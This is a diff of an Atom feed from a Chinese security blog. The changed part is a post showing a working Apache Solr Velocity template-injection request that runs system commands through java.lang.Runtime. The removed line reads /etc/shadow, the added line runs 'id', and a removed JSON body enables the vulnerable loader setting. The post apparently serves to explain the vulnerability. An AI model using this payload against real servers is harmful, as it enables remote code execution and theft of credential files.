@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-11-07T07:52:12.077Z</updated>
+    <updated>2019-11-12T08:06:48.372Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -80,21 +80,11 @@
 </li>
 </ul>
 <pre><code>使用刚才的path替换路径的test
-GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%27 /etc/shadow%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
+GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
 Host: 192.168.1.1:8983
 Content-Type: application/json
 Content-Length: 263
 
-{
-&quot;update-queryresponsewriter&quot;: {
-    &quot;startup&quot;: &quot;lazy&quot;,
-    &quot;name&quot;: &quot;velocity&quot;,
-    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
-    &quot;template.base.dir&quot;: &quot;&quot;,
-    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
-    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
-}
-}
 
 </code></pre>
 <figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1572507820201.png" alt=""></figure>
